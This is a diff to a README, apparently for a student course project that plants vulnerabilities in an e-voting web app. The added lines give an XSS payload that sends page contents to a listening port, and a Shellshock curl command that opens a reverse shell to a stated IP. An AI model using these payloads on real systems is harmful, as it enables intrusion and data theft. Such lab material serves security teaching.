@@ -23,8 +23,12 @@ When you download files from either folder, you can do the following step to ini
        
        $ cd cgi-bin
        $ chmod 755 home.cgi
+       $ chmod 755 login.cgi
+       $ chmod 755 vote.cgi
+       $ chmod 755 admin.cgi
+       $ chmod 755 register.cgi
 
-3. Switch to the root folder again. Run this command to compile the backend program and the frontend, and your frontend will start at localhost:8000.    
+4. Switch to the root folder again. Run this command to compile the backend program and the frontend, and your frontend will start at localhost:8000.    
 
        $ cd ..        
        $ make
@@ -170,18 +174,21 @@ The following are the malicious contents we added (you can check **"/etovucca/"*
 2. *XSS Attack (Completed)  
 
   We modified the structure of table Registration and add password to ensure that each vote is made by the voter.
-                    
-一张registration的截图和vote的截图
 
   We rewrite the register.cgi using python to make it eaiser to attack.
-  
-  register.cgi改的code
 
 ![ee2b50b7e0e9197b68100f62c291e11](https://user-images.githubusercontent.com/78676028/141211832-b76f9c04-1e47-4446-a88d-029b4c68ed25.png)
+
+Like what is shown in the above screenshot, you can launch XSS attack by writing **\<script>** contents into the **County** 
+field when registering. The input code example is the following:
+
+      \<script>document.write("<img src=http://127.0.0.1:5555?c="+escape(document.getElementById("result").innerHTML)+">");\</script>
 
 ![31f1fc1b4fd8829b4a2423b2a839787](https://user-images.githubusercontent.com/78676028/141211870-fa447c52-fe9e-492c-ae2c-e02b537ff214.png)
 
 ![65c1ea8e80fc02d8d9fda7f362fdc65](https://user-images.githubusercontent.com/78676028/141211892-e5aa986e-f7b3-4668-8235-0bc3c8348273.png)
+
+Then you can start listening the port while adding a new voter. You can see the submission of the user like the above with all sensitive information.
 
 3. *Shellshock (Completed)  
    
@@ -192,11 +199,19 @@ The following are the malicious contents we added (you can check **"/etovucca/"*
 
 ![8efc4d42775d0fd8d38ecab40dc75cb](https://user-images.githubusercontent.com/78676028/141211697-325996b6-465c-4613-9121-6af077ea0c6a.png)
 
-   Then we can carry out the Shellshock Attack like what we did in homework 2.
+   Running the database initialization, you can see that our original bash has been removed and we adopted the new vulnerable bash.
    
-   加油孙旭华
+Then we can carry out the Shellshock Attack like what we did in homework 2 with the following example code:
+
+      $ curl --header 'User-Agent: () { :; }; echo; /bin/bash -i > /dev/tcp/10.0.2.16/9090 0<&1 2>&1' http://localhost:8000/cgi-bin/home.cgi
+
+   You can change the IP inside the command to your own IP.
+
+
 ![19ce6ddac3e03f10fcf12afaac2921f](https://user-images.githubusercontent.com/78676028/141211804-15bebb90-90d3-43a9-84de-8c63df8922c6.png)
 
+   Similarly, by listening the corresponding port meanwhile, you can get the root privilege of the server. Here we just use a simple "ls" command to show the successful control.
+With this privilege, you can actually do anything to the server, and the database in the backend.
 
 4. Phishing Page (Completed)  
 
